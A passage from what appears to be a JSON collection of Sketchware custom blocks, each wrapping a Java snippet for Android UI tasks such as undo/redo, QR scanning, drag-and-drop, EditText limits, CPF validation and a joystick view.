mAfterChange;\n\t\n\t\t\tpublic void beforeTextChanged(CharSequence s, int start, int count,\n\t\t\t\t\tint after) {\n\t\t\t\t\tif (mIsUndoOrRedo) {\n\t\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\n\t\t\t\t\tmBeforeChange \u003d s.subSequence(start, start + count);\n\t\t\t}\n\t\n\t\t\tpublic void onTextChanged(CharSequence s, int start, int before,\n\t\t\t\t\tint count) {\n\t\t\t\t\tif (mIsUndoOrRedo) {\n\t\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\n\t\t\t\t\tmAfterChange \u003d s.subSequence(start, start + count);\n\t\t\t\t\tmEditHistory.add(new EditItem(start, mBeforeChange, mAfterChange));\n\t\t\t}\n\t\n\t\t\tpublic void afterTextChanged(Editable s) {\n\t\t\t}\n\t}\n}\r\n{\n","color":"#FF009688","name":"undoredo class","typeName":"","palette":"241","type":" ","spec":"undoredofunction"},{"code":"try {\n\tBitmap bitmap \u003d generateBarcodeBitmap(getIntent().getStringExtra(%1$s));\n\t %2$s.setImageBitmap(bitmap);\n} catch (Exception e) {\n\tSketchwareUtil.showMessage(getApplicationContext(), e.toString());\n}","color":"#FF000000","name":"transformar ","typeName":"","palette":"242","type":" ","spec":"Transformar string:%s em código de barra e retornar na imagem %m.imageview "},{"code":"#########","color":"#A1012445","name":"From DreamSPACE Dev ejjeejje","typeName":"","palette":"243","type":"h","spec":"Block By DreamSPACE official"},{"code":"CodeScannerView scannerView \u003d findViewById(R.id.%1$s);\n\nCodeScanner \u003d new CodeScanner(this, scannerView);\nCodeScanner.startPreview();\nCodeScanner.setDecodeCallback(new DecodeCallback() {\n\t    @Override public void onDecoded( \nfinal Result result) { runOnUiThread(new Runnable() {\n\t\t\t         @Override\n\t\t\t          public void run() { \nString %2$s \u003d result.getText();\n%3$s\n} }\n);\n} }\n);","color":"#90292E49","name":"QR code Scanner","typeName":"","palette":"243","type":"c","spec":"%m.view String %m.varStr"},{"code":"%1$s.setOnTouchListener(new View.OnTouchListener() {\n\t            @Override\n\t            public boolean onTouch(View v, MotionEvent event) {\n\t\t                if (event.getAction() \u003d\u003d MotionEvent.ACTION_DOWN) {\n\t\t\t                    ClipData.Item item \u003d new ClipData.Item((CharSequence) v.getTag());\n\t\t\t                    String[] mimeTypes \u003d {ClipDescription.MIMETYPE_TEXT_PLAIN};\n\t\t\t                    ClipData dragData \u003d new ClipData(v.getTag().toString(), mimeTypes, item);\n\t\t\t                    View.DragShadowBuilder shadowBuilder \u003d new View.DragShadowBuilder(v);\n\t\t\t                    v.startDragAndDrop(dragData, shadowBuilder, v, 0);\n\t\t\t                    %2$s\n\t\t\t                    return true;\n\t\t\t                } else {\n\t\t\t                    return false;\n\t\t\t                }\n\t\t            }\n\t        });","color":"#FF009688","name":"tornar view arrastavel","typeName":"","palette":"244","type":"c","spec":"Enquanto view:%m.view  for arrastado"},{"code":"%1$s.setOnDragListener(new View.OnDragListener() {\n\t            @Override\n\t            public boolean onDrag(View v, DragEvent event) {\n\t\t                int action \u003d event.getAction();\n\t\t                switch (action) {\n\t\t\t                    case DragEvent.ACTION_DRAG_STARTED:\n\t\t\t                        // Check if the event contains plain text data\n\t\t\t                        if (event.getClipDescription().hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN)) {\n\t\t\t\t                            return true;\n\t\t\t\t                        }\n\t\t\t                        return false;\n\t\t\t                    case DragEvent.ACTION_DROP:\n\t\t\t                        // Handle the dropped data\n\t\t\t                        ClipData.Item item \u003d event.getClipData().getItemAt(0);\n\t\t\t                        String dragData \u003d item.getText().toString();\n\t\t\t                         %2$s\n\t\t\t                        return true;\n\t\t\t                    default:\n\t\t\t                        return true;\n\t\t\t                }\n\t\t            }\n\t        });","color":"#FF009688","name":"caso for solto em","typeName":"","palette":"244","type":"c","spec":"Caso for solto em %m.view "},{"code":"","color":"#FF000000","name":"dd","typeName":"","palette":"244","type":"h","spec":"Drag and Drop"},{"code":"%2$s.setTag(%1$s);","color":"#FF673AB7","name":"set OnLongClickListener_copy64","typeName":"","palette":"244","type":" ","spec":"repetir pra cada item|colocar tag %s na view %m.view "},{"code":"%1$s.setOnLongClickListener(new View.OnLongClickListener() {\n\npublic boolean onLongClick(View v) {\n\nClipData.Item item \u003d new ClipData.Item(v.getTag().toString());\n\nClipData dragData \u003d new ClipData(v.getTag().toString(), new String[]{\n\nClipDescription.MIMETYPE_TEXT_PLAIN }, item);\n\nDragShadowBuilder myShadow \u003d new View.DragShadowBuilder(%1$s);\nif (Build.VERSION.SDK_INT \u003e\u003d 24){v.startDragAndDrop(dragData, myShadow, %1$s, 0); } else {\n\nv.startDrag(dragData, myShadow, %1$s, 0); }\n\nreturn true;\n\n}\n\n});\n\n","color":"#FF673AB7","name":"set OnLongClickListener","typeName":"","palette":"244","type":" ","spec":"setOnLongClickListener%m.view "},{"code":"}\n\nprotected class myDragEventListener implements View.OnDragListener {\n\npublic boolean onDrag(View v, DragEvent event) {\n\nfinal int action \u003d event.getAction();\n\nswitch(action) {\n\ncase DragEvent.ACTION_DRAG_STARTED:\n\nif (event.getClipDescription().hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN)) {\n\nvib.vibrate((long)100);\n\nv.invalidate();\n\nreturn true;\n\n}\n\nreturn false;\n\ncase DragEvent.ACTION_DRAG_ENTERED:\n\nv.invalidate();\n\nreturn true;\n\ncase DragEvent.ACTION_DRAG_LOCATION:\n\nreturn true;\n\ncase DragEvent.ACTION_DRAG_EXITED:\n\nv.invalidate();\n\nreturn true;\n\ncase DragEvent.ACTION_DROP:\n\nImageView view \u003d (ImageView) event.getLocalState();\n\nImageView myimageview \u003d new ImageView(MainActivity.this);\n\nv.setImageDrawable(view.getDrawable());\n\nLinearLayout container \u003d (LinearLayout) v;\n\ncontainer.addView(myimageview);\n\nv.invalidate();\n\nreturn true;\n\ncase DragEvent.ACTION_DRAG_ENDED:\n\nv.invalidate();\n\nif (event.getResult()) {\n\nvib.vibrate((long)100);\n\nshowMessage(\"The drop was handled.\");} else {\n\nshowMessage(\"The drop didn\u0027t work.\");\n\n}\n\nreturn true;\n\ndefault:\n\nshowMessage(\"Unknown action type received by OnDragListener.\");\n\nbreak;\n\n}\n\nreturn false;\n\n}\n\n};\n\n{\n\n","color":"#FF673AB7","name":"DragListen","typeName":"","palette":"244","type":" ","spec":"DragListener"},{"code":"}\nprotected class myDragEventListener implements View.OnDragListener {\npublic boolean onDrag(View v, DragEvent event) {\nfinal int action \u003d event.getAction();\nswitch(action) {\ncase DragEvent.ACTION_DRAG_STARTED:\nif (event.getClipDescription().hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN)) {\nvib.vibrate((long)100);\nv.invalidate();\nreturn true;\n}\nreturn false;\ncase DragEvent.ACTION_DRAG_ENTERED:\nv.invalidate();\nreturn true;\ncase DragEvent.ACTION_DRAG_LOCATION:\nreturn true;\ncase DragEvent.ACTION_DRAG_EXITED:\nv.invalidate();\nreturn true;\ncase DragEvent.ACTION_DROP:\nImageView view \u003d (ImageView) event.getLocalState();\n((ImageView)v).setImageDrawable(view.getDrawable());\nv.invalidate();\nreturn true;\ncase DragEvent.ACTION_DRAG_ENDED:\nv.invalidate();\nif (event.getResult()) {\nvib.vibrate((long)100);\nshowMessage(\"The drop was handled.\");} else {\nshowMessage(\"The drop didn\u0027t work.\");\n}\nreturn true;\ndefault:\nshowMessage(\"Unknown action type received by OnDragListener.\");\nbreak;\n}\nreturn false;\n}\n};\n\n{","color":"#FF673AB7","name":"DragListen_copy54","typeName":"","palette":"244","type":" ","spec":"DragListener atualizado"},{"code":"myDragEventListener dragListen \u003d new myDragEventListener();","color":"#FF673AB7","name":"Lugar de Arrastar","typeName":"","palette":"244","type":" ","spec":"iniciar lista de itens de lugares pra Arrastar"},{"code":"%1$s.setOnDragListener(dragListen);","color":"#FF673AB7","name":"item","typeName":"","palette":"244","type":" ","spec":"Repetir pra cada Item| lugar pra arrastavel :%m.view "},{"code":"Color.rgb(%1$s,%2$s,%3$s)","color":"#FFBDBDBD","name":"colorRGB","typeName":"","palette":"235","type":"s","spec":"color R:%d G:%d B:%d "},{"code":"SetContentView(R.layout.%1$s);","color":"#FFFFC107","name":"layout.xml","typeName":"","palette":"245","type":" ","spec":"Carregar XML:%s.inputOnly dentro da layout do app"},{"code":"String input%1$s \u003d %2$s;\nString[] words%1$s \u003d input%1$s.split(\" \");\nString result%1$s \u003d \"\";\nif (words%1$s.length \u003e 0) {\n    result%1$s +\u003d words%1$s[0].substring(0, 1).toUpperCase();\n}\nif (words%1$s.length \u003e 1) {\n    result%1$s +\u003d words%1$s[1].substring(0, 1).toUpperCase();\n}\nString %3$s \u003d result%1$s;","color":"#FF00ACC1","name":"Get Initials of First Two Words","typeName":"","palette":"240","type":" ","spec":"id:%d Pega as iniciais das duas primeiras palavras em %1$s.inputOnly e retorna em %2$s.inputOnly"},{"code":"%1$s","color":"#FF2196F3","name":"return","typeName":"","palette":"240","type":"s","spec":"Retorna Iniciais da variável %s.inputOnly "},{"code":"%1$s","color":"#FF2196F3","name":"result","typeName":"","palette":"239","type":"s","spec":"retornar variavel de resultado %s.inputOnly "},{"code":"if (%3$s.getText().toString().length() \u003e %2$s) {\n    String text%1$s \u003d %3$s.getText().toString().trim();\n    \n    // Obtém o último caractere antes de removê-lo\n    String extraChar \u003d text%1$s.substring(text%1$s.length() - 1);\n    \n    // Remove o último caractere\n    text%1$s \u003d text%1$s.substring(0, text%1$s.length() - 1);\n    \n    // Define o texto modificado de volta no EditText\n    %3$s.setText(text%1$s);\n    \n    // Posiciona o cursor após o último caractere\n    %3$s.setSelection(text%1$s.length());\n    \n    // Move o foco para %4$s\n    %4$s.requestFocus();\n    \n    // Adiciona o caractere removido de %3$s a %4$s\n    %4$s.setText(extraChar);\n    \n    // Move o cursor para o final de %4$s\n    %4$s.setSelection(%4$s.length());\n}","color":"#FF3F51B5","name":"slslakskd","typeName":"","palette":"246","type":" ","spec":"id:%d Quando ultrapassar %d   caracteres na editText:%m.edittext ir para editText:%m.edittext  com caractere extra"},{"code":"if (%3$s.getText().toString().length() \u003e %2$s) {\n    String text%1$s \u003d %3$s.getText().toString().trim();\n    \n    // Remove o último caractere\n    text%1$s \u003d text%1$s.substring(0, text%1$s.length() - 1);\n    \n    // Define o texto modificado de volta no EditText\n    %3$s.setText(text%1$s);\n    \n    // Posiciona o cursor após o último caractere\n    %3$s.setSelection(text%1$s.length());\n    \n    %4$s\n}","color":"#FF3F51B5","name":"slslakskd_copy31","typeName":"","palette":"246","type":"c","spec":"id:%d Quando ultrapassar %d  caracteres na editText:%m.edittext :"},{"code":"%1$s.requestFocus();\n%1$s.setSelection(%1$s.length());","color":"#FF3F51B5","name":"mddosjsnd","typeName":"","palette":"246","type":" ","spec":"Trocar para editView:%m.edittext "},{"code":"%1$s.setSelection(%1$s.length());","color":"#FF3F51B5","name":"kekdjffj","typeName":"","palette":"246","type":" ","spec":"Mover Cursor no final do editText:%m.edittext "},{"code":"%1$s.setSelection(0);","color":"#FF3F51B5","name":"kekdjffj_copy20","typeName":"","palette":"246","type":" ","spec":"Mover Cursor no início do editText:%m.edittext "},{"code":"if (%1$s.getText().toString().length() \u003d\u003d 0) {\n%2$s\n}","color":"#FF3F51B5","name":"iskdjdj","typeName":"","palette":"246","type":"c","spec":"Se editView:%m.edittext  estiver vazia","spec2":"else"},{"code":"if (%3$s.getText().toString().length() \u003e %2$s) {\n    String text%1$s \u003d %3$s.getText().toString().trim();\n    \n    // Remove o último caractere\n    text%1$s \u003d text%1$s.substring(0, text%1$s.length() - 1);\n    \n    // Define o texto modificado de volta no EditText\n    %3$s.setText(text%1$s);\n    \n    // Posiciona o cursor após o último caractere\n    %3$s.setSelection(text%1$s.length());\n    \n}","color":"#FF3F51B5","name":"kekdkdkd","typeName":"","palette":"246","type":" ","spec":"id:%d Definir limite de %d caracteres na editText:%m.edittext "},{"code":"if (%2$s.getText().toString().length() \u003e %1$s) {\n    %3$s\n}","color":"#FF3F51B5","name":"kekdkdkd_copy84","typeName":"","palette":"246","type":"c","spec":"Definir limite de %d caracteres na editText:%m.edittext ,se passar do limite:"},{"code":"if (%2$s.getText().toString().length() \u003e %1$s) {\n    %3$s\n}else{ if (%2$s.getText().toString().length() \u003d\u003d %1$s) {\n%4$s\n}}","color":"#FF3F51B5","name":"kekdkdkd_copy93","typeName":"","palette":"246","type":"e","spec":"Definir limite de %d caracteres na editText:%m.edittext ,se passar do limite:","spec2":"Se estiver completo"},{"code":"if (%2$s.getText().toString().length() \u003c %1$s) {\n    %3$s\n}","color":"#FF3F51B5","name":"kekdkdkd_copy55","typeName":"","palette":"246","type":"c","spec":"Definir limite de %d caracteres na editText:%m.edittext ,se não estiver completo:","spec2":"Se estiver completo"},{"code":"%2$s.setText(%2$s.getText().toString().replace(%1$s, \"\"));","color":"#FF3F51B5","name":"remover char","typeName":"","palette":"246","type":" ","spec":"Remover caractere:%s da editText:%m.edittext "},{"code":"%3$s.setText(%3$s.getText().toString().replace(%1$s, %2$s));","color":"#FF3F51B5","name":"replace char by","typeName":"","palette":"246","type":" ","spec":"Substituir caracter:%s por %s  na editText:%m.edittext "},{"code":"%1$s.getText().toString().length()","color":"#FF3F51B5","name":"obter lenght","typeName":"","palette":"246","type":"s","spec":"obter tamanho do editText:%m.edittext "},{"code":"if (%1$s.getText().toString().length() \u003d\u003d %2$s) {\n%3$s\n}","color":"#FF3F51B5","name":"if complete","typeName":"","palette":"246","type":"c","spec":"Se EditText:%m.edittext estiver com %d caracteres"},{"code":"if (%1$s.getText().toString().length() \u003d\u003d %2$s) {\n%3$s\n}else{\n%4$s\n}","color":"#FF3F51B5","name":"if complete_copy75","typeName":"","palette":"246","type":"e","spec":"Se EditText:%m.edittext estiver com %d caracteres","spec2":""},{"code":"%1$s.getText().toString().length() \u003d\u003d %2$s","color":"#FF3F51B5","name":"if complete boolean","typeName":"","palette":"246","type":"b","spec":"Se editText:%m.edittext  estiver com %d caracteres "},{"code":"DisplayMetrics displayMetrics%2$s \u003d new DisplayMetrics();\ngetWindowManager().getDefaultDisplay().getMetrics(displayMetrics);\n\nint screenWidth%2$s \u003d displayMetrics.widthPixels;\nint screenHeight%2$s \u003d displayMetrics.heightPixels;\n\n// Exemplo de ajuste para um TextView\nTextView %1$s \u003d findViewById(R.id.%1$s);  // Substitua R.id.textView pelo ID da sua TextView\nViewGroup.LayoutParams layoutParams \u003d %1$s.getLayoutParams();\nlayoutParams.width \u003d screenWidth / 2;  // Definindo a largura como metade da largura da tela\nlayoutParams.height \u003d ViewGroup.LayoutParams.WRAP_CONTENT;  // Mantendo a altura como conteúdo padrão\n%1$s.setLayoutParams(layoutParams);","color":"#1976D2","name":"ajustarComResolution","typeName":"","palette":"9","type":" ","spec":"Ajustar view:%m.view com resolução atual id:%s.inputOnly "},{"code":"final VideoView vd \u003d new VideoView(MainActivity.this);\n\nvd.setLayoutParams(new LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.MATCH_PARENT));\n\n\n\nvd.setVideoURI(Uri.parse(\"android.resource://\"+getPackageName()+\"/R.%1$s.%2$s\"));\n\nvd.requestFocus();\n\nvd.start();\n\n\n//this layout will conatin your video view\n\nRelativeLayout rl \u003d new RelativeLayout(this);\n\n\n\n//this layout will contain your widgets which are to be shown on video\n\nRelativeLayout rl2 \u003d new RelativeLayout(this);\n\n\nrl2.addView(vd, -1,-1);\n\n\n%3$s.removeAllViews();\n\n\nrl.addView(rl2, -1,-1);\n\nrl.addView(linear2, -1,-1);\n\n\n\n%3$s.addView(rl,-1,-1);\n\n\n\n//this property will all the video to be played in full screen\n\nDisplayMetrics metrics \u003d new DisplayMetrics(); getWindowManager().getDefaultDisplay().getMetrics(metrics); android.widget.RelativeLayout.LayoutParams params \u003d (android.widget.RelativeLayout.LayoutParams) vd.getLayoutParams();\n\nparams.addRule(android.widget.RelativeLayout.ALIGN_PARENT_TOP, android.widget.RelativeLayout.TRUE);\n\nparams.addRule(android.widget.RelativeLayout.ALIGN_PARENT_START, android.widget.RelativeLayout.TRUE);\n\nparams.addRule(android.widget.RelativeLayout.ALIGN_PARENT_END, android.widget.RelativeLayout.TRUE);\n\nparams.addRule(android.widget.RelativeLayout.ALIGN_PARENT_BOTTOM, android.widget.RelativeLayout.TRUE);\n\nvd.requestLayout();","color":"#FFE91E63","name":"colocar video no linear layout","typeName":"","palette":"247","type":" ","spec":"Pegar video do resource da pasta:%s.inputOnly  video:%s.inputOnly   .mp4 na linearview:%m.view "},{"code":"String cpf%1$s \u003d %2$s; // Substitua pelo CPF que deseja testar\n\n// Remove os caracteres não numéricos\ncpf%1$s \u003d cpf%1$s.replaceAll(\"\\\\D\", \"\");\n\n isValid%1$s \u003d true;\n\nif (cpf%1$s.length() !\u003d 11 || cpf%1$s.matches(\"(\\\\d)\\\\1{10}\")) {\n    isValid%1$s \u003d false;\n} else {\n    try {\n        // Cálculo do 1º Dígito Verificador\n        int sm \u003d 0;\n        int peso \u003d 10;\n        for (int i \u003d 0; i \u003c 9; i++) {\n            int num \u003d cpf%1$s.charAt(i) - \u00270\u0027;\n            sm +\u003d num * peso;\n            peso--;\n        }\n\n        int r \u003d 11 - (sm % 11);\n        char dig10 \u003d (r \u003d\u003d 10 || r \u003d\u003d 11) ? \u00270\u0027 : (char) (r + \u00270\u0027);\n\n        // Cálculo do 2º Dígito Verificador\n        sm \u003d 0;\n        peso \u003d 11;\n        for (int i \u003d 0; i \u003c 10; i++) {\n            int num \u003d cpf%1$s.charAt(i) - \u00270\u0027;\n            sm +\u003d num * peso;\n            peso--;\n        }\n\n        r \u003d 11 - (sm % 11);\n        char dig11 \u003d (r \u003d\u003d 10 || r \u003d\u003d 11) ? \u00270\u0027 : (char) (r + \u00270\u0027);\n\n        // Verifica se os dígitos calculados conferem com os dígitos informados\n        if (dig10 \u003d\u003d cpf%1$s.charAt(9) \u0026\u0026 dig11 \u003d\u003d cpf%1$s.charAt(10)) {\n            isValid%1$s \u003d true;\n        } else {\n            isValid%1$s \u003d false;\n        }\n    } catch (Exception e) {\n        isValid%1$s \u003d false;\n    }\n}","color":"#FF3F51B5","name":"verify cpf","typeName":"","palette":"240","type":" ","spec":"id:%d  Verificar se CPF:%s existe"},{"code":"isValid%1$s","color":"#FF3F51B5","name":"returnValidCPF","typeName":"","palette":"240","type":"b","spec":"retornar Validade do CPF de ID:%d  "},{"code":"SimpleDateFormat dateFormat%1$s \u003d new SimpleDateFormat(\"dd/MM/yyyy\", Locale.getDefault());\n\ntry {\n    // Definindo a data limite\n    Date dataLimite%1$s \u003d dateFormat%1$s.parse(%2$s);\n    \n    // Inicializando dataHora%1$s com a data atual\n    Date dataHora%1$s \u003d new Date();\n\n    // Comparando dataHora%1$s com a data limite\n    if (dataHora%1$s.after(dataLimite%1$s)) {\n        %3$s\n    } else {\n        %4$s\n    }\n} catch (java.text.ParseException e) {\n    e.printStackTrace();\n    // Handle parsing exception\n}","color":"#FF000000","name":"definir data limte","typeName":"","palette":"248","type":"e","spec":"id:%d  definir expiração do uso do app em **/**/****:%s ,se expirar:","spec2":"else"},{"code":"SimpleDateFormat dateFormat%1$s \u003d new SimpleDateFormat(%2$s, Locale.getDefault());\n\ntry {\n    // Definindo a data limite\n    Date dataLimite%1$s \u003d dateFormat%1$s.parse(%3$s);\n    \n    // Inicializando dataHora%1$s com a data atual\n    Date dataHora%1$s \u003d new Date();\n\n    // Comparando dataHora%1$s com a data limite\n    if (dataHora%1$s.after(dataLimite%1$s)) {\n        %4$s\n    } else {\n        %5$s\n    }\n} catch (java.text.ParseException e) {\n    e.printStackTrace();\n    // Handle parsing exception\n}","color":"#FF000000","name":"definir data limte_copy30","typeName":"","palette":"248","type":"e","spec":"id:%d  definir expiração do uso do app em formato:%s :%s ,se expirar:","spec2":"else"},{"code":"%1$s.goBack();","color":"#FF00ACC1","name":"Voltar para Página Anterior","typeName":"","palette":"229","type":" ","spec":"Voltar para página anterior em %m.webview"},{"code":"%1$s.goForward();","color":"#FF00ACC1","name":"Avançar para Próxima Página","typeName":"","palette":"229","type":" ","spec":"Avançar para próxima página em %m.webview"},{"code":"if(android.os.Build.VERSION.SDK_INT \u003e\u003d android.os.Build.VERSION_CODES.HONEYCOMB) {\n\ngetWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);\n\n}","color":"#FF000000","name":"BlockScreenShot","typeName":"","palette":"248","type":" ","spec":"BlockScreenShot"},{"code":"","color":"#FF4A148C","typeName":"","name":"Place in More block (by Isaac Ware YouTube)","palette":"249","type":"h","spec":"Place in More block (by Isaac Ware YouTube)"},{"code":"}\r\nJoystickView joystick;\r\n{","color":"#FF4A148C","typeName":"","name":"Variable Library | place in moreblock Variable","palette":"249","type":" ","spec":"Variable Library | place in moreblock Variable"},{"code":"}\r\npublic static class JoystickView extends View\nimplements\nRunnable {\n\t\t\n\t\t\n\t\t\n\t\tpublic interface OnMoveListener {\n\t\t\t\t\n\t\t\t\t\n\t\t\t\tvoid onMove(int angle, int strength);\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic interface OnMultipleLongPressListener {\n\t\t\t\t\n\t\t\t\tvoid onMultipleLongPress();\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tprivate static final int DEFAULT_LOOP_INTERVAL \u003d 50; // in milliseconds\n\t\t\n\t\t\n\t\tprivate static final int MOVE_TOLERANCE \u003d 10;\n\t\t\n\t\t\n\t\tprivate static final int DEFAULT_COLOR_BUTTON \u003d Color.BLACK;\n\t\t\n\t\t\n\t\tprivate static final int DEFAULT_COLOR_BORDER \u003d Color.TRANSPARENT;\n\t\t\n\t\t\n\t\tprivate static final int DEFAULT_ALPHA_BORDER \u003d 255;\n\t\t\n\t\t\n\t\tprivate static final int DEFAULT_BACKGROUND_COLOR \u003d Color.TRANSPARENT;\n\t\t\n\t\t\n\t\tprivate static final int DEFAULT_SIZE \u003d 200;\n\t\t\n\t\t\n\t\tprivate static final int DEFAULT_WIDTH_BORDER \u003d 3;\n\t\t\n\t\t\n\t\tprivate static final boolean DEFAULT_FIXED_CENTER \u003d true;\n\t\t\n\t\t\n\t\t\n\t\tprivate static final boolean DEFAULT_AUTO_RECENTER_BUTTON \u003d true;\n\t\t\n\t\t\n\t\t\n\t\tprivate static final boolean DEFAULT_BUTTON_STICK_TO_BORDER \u003d false;\n\t\t\n\t\t\n\t\t// DRAWING\n\t\tprivate Paint mPaintCircleButton;\n\t\tprivate Paint mPaintCircleBorder;\n\t\tprivate Paint mPaintBackground;\n\t\t\n\t\tprivate Paint mPaintBitmapButton;\n\t\tprivate Bitmap mButtonBitmap;\n\t\t\n\t\t\n\t\t/**\n* Ratio use to define the size of the button\n*/\n\t\tprivate float mButtonSizeRatio;\n\t\t\n\t\t\n\t\t/**\n* Ratio use to define the size of the background\n*\n*/\n\t\tprivate float mBackgroundSizeRatio;\n\t\t\n\t\t\n\t\t// COORDINATE\n\t\tprivate int mPosX \u003d 0;\n\t\tprivate int mPosY \u003d 0;\n\t\tprivate int mCenterX \u003d 0;\n\t\tprivate int mCenterY \u003d 0;\n\t\t\n\t\tprivate int mFixedCenterX \u003d 0;\n\t\tprivate int mFixedCenterY \u003d 0;\n\t\t\n\t\t\n\t\tprivate boolean mFixedCenter;\n\t\t\n\t\t\n\t\t\n\t\tprivate boolean mAutoReCenterButton;\n\t\t\n\t\t\n\t\t\n\t\tprivate boolean mButtonStickToBorder;\n\t\t\n\t\t\n\t\t\n\t\tprivate boolean mEnabled;\n\t\t\n\t\t\n\t\t// SIZE\n\t\tprivate int mButtonRadius;\n\t\tprivate int mBorderRadius;\n\t\t\n\t\t\n\t\t\n\t\tprivate int mBorderAlpha;\n\t\t\n\t\t\n\t\t\n\t\tprivate float mBackgroundRadius;\n\t\t\n\t\t\n\t\t/**\n* Listener used to dispatch OnMove event\n*/\n\t\tprivate OnMoveListener mCallback;\n\t\t\n\t\tprivate long mLoopInterval \u003d DEFAULT_LOOP_INTERVAL;\n\t\tprivate Thread mThread \u003d new Thread(this);\n\t\t\n\t\t\n\t\t/**\n* Listener used to dispatch MultipleLongPress event\n*/\n\t\tprivate OnMultipleLongPressListener mOnMultipleLongPressListener;\n\t\t\n\t\tprivate final android.os.Handler mHandlerMultipleLongPress \u003d new android.os.Handler();\n\t\tprivate Runnable mRunnableMultipleLongPress;\n\t\tprivate int mMoveTolerance;\n\t\t\n\t\t\n\t\t\n\t\tpublic static int BUTTON_DIRECTION_BOTH \u003d 0;\n\t\t\n\t\t\n\t\tprivate int mButtonDirection \u003d 0;\n\t\t\n\t\t// styleable\n\t\tpublic final int[] JoystickView \u003d new int[]{2130771968, 2130771969, 2130771970, 2130771971, 2130771972, 2130771973, 2130771974, 2130771975, 2130771976, 2130771977, 2130771978, 2130771979, 2130771980};\n\t\tpublic final int JoystickView_JV_autoReCenterButton \u003d 0;\n\t\tpublic final int JoystickView_JV_backgroundColor \u003d 1;\n\t\tpublic final int JoystickView_JV_backgroundSizeRatio \u003d 2;\n\t\tpublic final int JoystickView_JV_borderAlpha \u003d 3;\n\t\tpublic final int JoystickView_JV_borderColor \u003d 4;\n\t\tpublic final int JoystickView_JV_borderWidth \u003d 5;\n\t\tpublic final int JoystickView_JV_buttonColor \u003d 6;\n\t\tpublic final int JoystickView_JV_buttonDirection \u003d 7;\n\t\tpublic final int JoystickView_JV_buttonImage \u003d 8;\n\t\tpublic final int JoystickView_JV_buttonSizeRatio \u003d 9;\n\t\tpublic final int JoystickView_JV_buttonStickToBorder \u003d 10;\n\t\tpublic final int JoystickView_JV_enabled \u003d 11;\n\t\tpublic final int JoystickView_JV_fixedCenter \u003d 12;\n\t\t\n\t\t\n\t\t\n\t\tpublic JoystickView(Context context) {\n\t\t\t\tthis(context, null);\n\t\t}\n\t\t\n\t\t\n\t\tpublic JoystickView(Context context, AttributeSet attrs, int defStyleAttr) {\n\t\t\t\tthis(context, attrs);\n\t\t}\n\t\t\n\t\t\n\t\t\n\t\tpublic JoystickView(Context context, AttributeSet attrs) {\n\t\t\t\tsuper(context, attrs);\n\t\t\t\t\n\t\t\t\tandroid.content.res.TypedArray styledAttributes \u003d context.getTheme().obtainStyledAttributes(\n\t\t\t\tattrs,\n\t\t\t\tJoystickView,\n\t\t\t\t0, 0\n\t\t\t\t);\n\t\t\t\t\n\t\t\t\tint buttonColor;\n\t\t\t\tint borderColor;\n\t\t\t\tint backgroundColor;\n\t\t\t\tint borderWidth;\n\t\t\t\tandroid.graphics.drawable.Drawable buttonDrawable;\n\t\t\t\ttry {\n\t\t\t\t\t\tbuttonColor \u003d styledAttributes.getColor(JoystickView_JV_buttonColor, DEFAULT_COLOR_BUTTON);\n\t\t\t\t\t\tborderColor \u003d styledAttributes.getColor(JoystickView_JV_borderColor, DEFAULT_COLOR_BORDER);\n\t\t\t\t\t\tmBorderAlpha \u003d styledAttributes.getInt(JoystickView_JV_borderAlpha, DEFAULT_ALPHA_BORDER);\n\t\t\t\t\t\tbackgroundColor \u003d styledAttributes.getColor(JoystickView_JV_backgroundColor, DEFAULT_BACKGROUND_COLOR);\n\t\t\t\t\t\tborderWidth \u003d styledAttributes.getDimensionPixelSize(JoystickView_JV_borderWidth, DEFAULT_WIDTH_BORDER);\n\t\t\t\t\t\tmFixedCenter \u003d styledAttributes.getBoolean(JoystickView_JV_fixedCenter, DEFAULT_FIXED_CENTER);\n\t\t\t\t\t\tmAutoReCenterButton \u003d styledAttributes.getBoolean(JoystickView_JV_autoReCenterButton, DEFAULT_AUTO_RECENTER_BUTTON);\n\t\t\t\t\t\tmButtonStickToBorder \u003d styledAttributes.getBoolean(JoystickView_JV_buttonStickToBorder, DEFAULT_BUTTON_STICK_TO_BORDER);\n\t\t\t\t\t\tbuttonDrawable \u003d styledAttributes.getDrawable(JoystickView_JV_buttonImage);\n\t\t\t\t\t\tmEnabled \u003d styledAttributes.getBoolean(JoystickView_JV_enabled, true);\n\t\t\t\t\t\tmButtonSizeRatio \u003d styledAttributes.getFraction(JoystickView_JV_buttonSizeRatio, 1, 1, 0.25f);\n\t\t\t\t\t\tmBackgroundSizeRatio \u003d styledAttributes.getFraction(JoystickView_JV_backgroundSizeRatio, 1, 1, 0.75f);\n\t\t\t\t\t\tmButtonDirection \u003d styledAttributes.getInteger(JoystickView_JV_buttonDirection, BUTTON_DIRECTION_BOTH);\n\t\t\t\t} finally {\n\t\t\t\t\t\tstyledAttributes.recycle();\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// Initialize the drawing according to attributes\n\t\t\t\t\n\t\t\t\tmPaintCircleButton \u003d new Paint();\n\t\t\t\tmPaintCircleButton.setAntiAlias(true);\n\t\t\t\tmPaintCircleButton.setColor(buttonColor);\n\t\t\t\tmPaintCircleButton.setStyle(Paint.Style.FILL);\n\t\t\t\t\n\t\t\t\tif (buttonDrawable !\u003d null) {\n\t\t\t\t\t\tif (buttonDrawable instanceof android.graphics.drawable.BitmapDrawable) {\n\t\t\t\t\t\t\t\tmButtonBitmap \u003d ((android.graphics.drawable.BitmapDrawable) buttonDrawable).getBitmap();\n\t\t\t\t\t\t\t\tmPaintBitmapButton \u003d new Paint();\n\t\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tmPaintCircleBorder \u003d new 